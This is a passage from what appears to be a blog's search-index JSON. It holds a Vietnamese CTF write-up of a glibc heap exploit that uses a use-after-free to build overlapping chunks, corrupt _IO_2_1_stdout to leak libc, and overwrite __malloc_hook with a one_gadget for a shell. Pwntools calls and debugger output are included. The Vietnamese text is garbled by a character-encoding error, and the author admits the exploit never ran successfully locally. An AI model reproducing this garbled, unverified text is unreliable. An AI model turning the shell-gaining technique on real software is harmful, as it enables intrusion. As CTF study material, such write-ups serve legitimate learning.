b√†i n√†y kh√¥ng c√≥ gi·ªõi h·∫°n s·ªë l∆∞·ª£ng chunk ƒë∆∞·ª£c cho ph√©p.\nH√†m Delete: Bug n·∫±m ·ªü trong h√†m delete n√†y, b·∫•t c·ª© m·ªôt ng∆∞·ªùi ch∆°i pwn n√†o khi nh√¨n v√†o h√†m n√†y c≈©ng s·∫Ω nh·∫≠n ra ƒë∆∞·ª£c bug :lol: Bug ·ªü ƒë√¢y ƒë√≥ l√† h√†m n√†y kh√¥ng set pointer v·ªÅ null d·∫´n ƒë·∫øn l·ªói use-after-free ho·∫∑c l√† double free, c√≥ r·∫•t l√† nhi·ªÅu c√°ch ƒë·ªÉ t·∫≠n d·ª•ng hai l·ªói n√†y.\n·ªû b√†i n√†y ta c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªói uaf t·∫°o ra chunk overlapped ƒë·ªÉ h√¨nh th√†nh unsorted bin sau ƒë√≥ ghi ƒë√® fd m·ªôt chunk ƒë·ªÉ leak libc, ngo√†i ra th√¨ ta c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªói uaf ƒë·ªÉ h∆∞·ªõng ƒë·∫øn c·∫•u tr√∫c stdout, modify flags bit ƒë·ªÉ leak libc, v√¨ b√†i n√†y kh√¥ng c√≥ h√†m in ra n√™n m√¨nh s·∫Ω k·∫øt h·ª£p c·∫£ hai c√°ch tr√™n ƒë·ªÉ c√≥ th·ªÉ leak ra ƒë∆∞·ª£c flag.\nM√¨nh kh√¥ng bi·∫øt b√†i n√†y r·ªët cu·ªôc b·ªã c√°i g√¨, nh∆∞ng m√† l√†m ·ªü local d√πng env libc-2.23.so th√¨ b·ªã l·ªói timeout, c√≤n n·∫øu d√πng env ·ªü m√°y m√¨nh th√¨ kh√¥ng t·∫≠n d·ª•ng bug ·ªü tr√™n ƒë∆∞·ª£c ,m√¨nh ng·ªìi loay hoay s·ª≠a g·∫ßn c·∫£ ti·∫øng v·∫´n kh√¥ng fix ƒë∆∞·ª£c :sadge_pepe:. V·∫≠y n√™n m√¨nh s·∫Ω n√≥i s∆° qua v·ªÅ √Ω t∆∞·ªüng exploit v√† m√¨nh ƒë·ªÉ script exploit ·ªü b√™n d∆∞·ªõi, c√≤n n·∫øu b·∫°n mu·ªën th√¨ b·∫°n h√£y debug ƒë·ªÉ h√¨nh dung technique tr√™n ho·∫°t ƒë·ªông ra sao, I\u0026rsquo;m so sorry :(\nH∆∞·ªõng exploit # ƒê·∫ßu ti√™n th√¨ fd pointer c·ªßa fastbin s·∫Ω tr·ªè ƒë·∫øn libc c·ª• th·ªÉ l√† main_arena + 88, nh∆∞ng b·ªüi v√¨ size ƒë∆∞·ª£c cho ph√©p ph·∫£i nh·ªè h∆°n 0x60 n√™n kh√¥ng th·ªÉ tr·ª±c ti·∫øp l·∫•y ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa libc th√¥ng qua fd pointer, thay v√†o ƒë√≥ ta s·∫Ω t·∫≠n d·ª•ng l·ªói uaf, th√¥ng qua bug tr√™n th√¨ ta c√≥ th·ªÉ ƒë·∫©y 1 chunk v√†o fastbin, sau ƒë√≥ ta c√≥ th·ªÉ fake m·ªôt chunk v·ªõi size t∆∞∆°ng th√≠ch v·ªõi size c·ªßa unsorted_bin, sau ƒë√≥ free chunk ƒë√≥ m·ªôt l·∫ßn n·ªØa, k·∫øt qu·∫£ l√† chunk m√† ch√∫ng ta fake s·∫Ω n·∫±m trong fastbin v√† unsorted_bin, ngo√†i ra fd pointer s·∫Ω tr·ªè ƒë·∫øn libc. Sau khi c√≥ ƒë∆∞·ª£c libc th√¨ ch·ªâ c·∫ßn t·∫≠n d·ª•ng l·ªói uaf ghi ƒë√® malloc_hook th√†nh one_gadget ƒë·ªÉ c√≥ ƒë∆∞·ª£c shell. √ù t∆∞·ªüng l√† nh∆∞ v·∫≠y.\nƒê·∫ßu ti√™n th√¨ m√¨nh s·∫Ω alloc 3 chunk v·ªõi size 0x70 v√† sau ƒë√≥ free hai chunk ƒë·∫ßu ti√™n ƒë·ªÉ t·∫≠n d·ª•ng l·ªói uaf v·ªõi m·ª•c ƒë√≠ch ch·ªìng ch√©o c√°c chunk l√™n nhau cho b∆∞·ªõc ti·∫øp theo ƒë√≥ l√† modify ƒë·ªãa ch·ªâ c·∫ßn mu·ªën. alloc(0,0x60,p64(0) + p64(0x71)) alloc(1,0x60,p64(0) + p64(0x51)) alloc(2,0x60,p64(0)*3 + p64(0x51)) delete(0) delete(1) rename(1,b\u0026#39;\\x10\u0026#39;) alloc(3,0x60,b\u0026#39;a\u0026#39;) # b√¢y gi·ªù fd c·ªßa chunk 3 tr·ªè t·ªõi ƒë·ªãa ch·ªâ c·ªßa chunk1+0x10 B√¢y gi·ªù ta malloc chunk 4, sau ƒë√≥ rename chunk 4 ƒë·ªÉ c√≥ th·ªÉ modify size c·ªßa chunk 1 b·ªüi v√¨ ta ƒë√£ t·∫°o 1 link gi·ªØa chunk 3 v√† chunk 1(fd chunk 3 -\u0026gt; chunk1 + 0x10) c√≥ nghƒ©a l√† khi ta modify chunk 3 th√¨ ta ƒëang modify chunk 1. Free chunk 1 ƒë·ªÉ ƒë·∫©y chunk 1 v√†o fastbin, thay ƒë·ªïi size sao cho size c·ªßa chunk 1 t∆∞∆°ng th√≠ch v·ªõi size c·ªßa unsorted_bin. K·∫øt qu·∫£ ta thu l·∫°i ƒë∆∞·ª£c ƒë√≥ l√† chunk 1 ƒëang n·∫±m ·ªü fastbin v√† unsorted_bin (Minh h·ªça cho √Ω t∆∞·ªüng tr√™n)\nalloc(4,0x60,p64(0)*0xb + p64(0x71)) delete(1) rename(4,p64(0)*0xb + p64(0x91)) delete(1) gdb.attach(r) B√¢y gi·ªù th√¨ ta ch·ªâ c·∫ßn modify 2 byte cu·ªëi fd pointer c·ªßa chunk 1(main_arena + 88) n·∫±m trong unsorted_bin th√†nh ƒë·ªãa ch·ªâ m√† ta mu·ªën. C√°i m√† g·∫ßn nh·∫•t v·ªõi main_arena + 88 ch√≠nh l√† _IO_2_1_stdout, ch·ªâ c√≥ 4 byte cu·ªëi c·ªßa hai ƒë·ªãa ch·ªâ m√† ta n√≥i ·ªü tr√™n l√† kh√°c nhau B·ªüi v√¨ aslr tr√™n server ƒë∆∞·ª£c b·∫≠t v√¨ v·∫≠y n·∫øu ta ghi ƒë√® 0x7fxxxxx5b78 th√†nh 0x7fxxxxx6620 th√¨ kh√¥ng kh·∫£ thi v√¨ 3 bits cu·ªëi 620 s·∫Ω gi·ªØ nguy√™n, nh∆∞ng bit th·ª© 4 t·ª´ d∆∞·ªõi l√™n(\u0026ldquo;6\u0026rdquo;) s·∫Ω lu√¥n random\nT√¨m ki·∫øm m·ªôt l√∫c th√¨ c√≥ 1 ƒë·ªãa ch·ªâ ph√π h·ª£p ƒë√≥ l√† 0x7fxxxxx25dd, v√¨ bit 5dd(ƒë·ªãa ch·ªâ c·ªßa fake chunk) gi·ªØ nguy√™n c√≤n bit c√≥ gi√° tr·ªã \u0026ldquo;2\u0026rdquo; random th√¨ ta c√≥ th·ªÉ brute-force ƒë·∫øn khi n√†o g·∫∑p ƒë∆∞·ª£c bit ƒë√≥. Sau khi ta ƒë√£ applied ƒë·ªãa ch·ªâ fd c·ªßa 2 chunk(m·ªôt c√°i n·∫±m ·ªü fastbin v√† c√°i c√≤n l·∫°i ·ªü unsorted_bin) c√≥ size 0x70 g·∫ßn v·ªõi ƒë·ªãa ch·ªâ c·ªßa _IO_2_1_stdout b·∫±ng c√°ch ghi ƒë√® ƒë·ªãa ch·ªâ c·ªßa main_arena+88 th√†nh 0x7fxxxx25dd th√¨ ta s·∫Ω fill bi·∫øn flags c·ªßa _IO_stdout th√†nh 0xfbad1800 v√† 2 s·ªë cu·ªëi c·ªßa _IO_write_base th√†nh \\x00 s·∫Ω khi·∫øn cho n√≥ nh·ªè h∆°n do ƒë√≥ ta s·∫Ω leak ƒë∆∞·ª£c nhi·ªÅu th·ª© h∆°n.\nrename(1,b\u0026#39;\\xdd\\x25\u0026#39;) alloc(5,0x60,b\u0026#39;a\u0026#39;) alloc(6,0x60,b\u0026#39;A\u0026#39;*0x33 + p64(0xfbad1800) + p64(0)*3 + b\u0026#39;\\x00\u0026#39;) Sau khi ƒë√£ ghi ƒë√® th√¨ struct c·ªßa _IO_2_1_stdout s·∫Ω nh∆∞ n√†y\npwndbg\u0026gt; p _IO_2_1_stdout_ $2 = { file = { _flags = -72542208, //0xfbad1800 _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x7ffff7dd2600 \u0026lt;_IO_2_1_stderr_+192\u0026gt; \u0026#39;A\u0026#39; \u0026lt;repeats 32 times\u0026gt;, //ghi ƒë√® 2 s·ªë cu·ªëi th√†nh \\x00 . . . }, vtable = 0x7ffff7dd06e0 \u0026lt;_IO_file_jumps\u0026gt; } Sau khi modified stdout th√¨ khi ch∆∞∆°ng tr√¨nh g·ªçi puts(·ªü l·∫ßn ti·∫øp theo) th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω in ra ƒë·ªãa ch·ªâ c·ªßa _IO_2_1_stderr v√¨ n√≥ n·∫±m ·ªü sau _IO_list_all (t·ªâ l·ªá 1/16 khi brute-force ta s·∫Ω leak ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa libc :lol:) Sau khi ƒë√£ c√≥ libc base address th√¨ ta c√≥ ƒë∆∞·ª£c ƒë·ªãa ch·ªâ g·ªëc c·ªßa malloc_hook, sau ƒë√≥ d√πng theo ph∆∞∆°ng ph√°p tr√™n, ta malloc m·ªôt chunk v·ªõi size 0x60 ƒë·ªÉ ƒë·∫©y chunk ƒë√≥ v√†o fastbin, ti·∫øp theo modify fd c·ªßa chunk ƒë√≥ v√†o fake chunk m√† ta mu·ªën, ·ªü ƒë√¢y ƒë√≥ l√† malloc_hook - 0x23. Malloc chunk ƒë√≥ l·∫°i ƒë·ªÉ c√≥ ƒë∆∞·ª£c fake chunk ta mu·ªën, sau ƒë√≥ malloc m·ªôt chunk v·ªõi size 0x60, fill b·ªüi one_gadget. Cu·ªëi c√πng malloc m·ªôt chunk m·ªõi ƒë·ªÉ trigger malloc_hook l√† c√≥ ƒë∆∞·ª£c shell.\n","date":"16 September 2022","externalUrl":null,"permalink":"/posts/technique_angelboy_leak/","section":"Posts","summary":"A technique for you to leak libc without output function","title":"Technique: Angelboy's Leak: using IO_FILE to leak libc"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"}]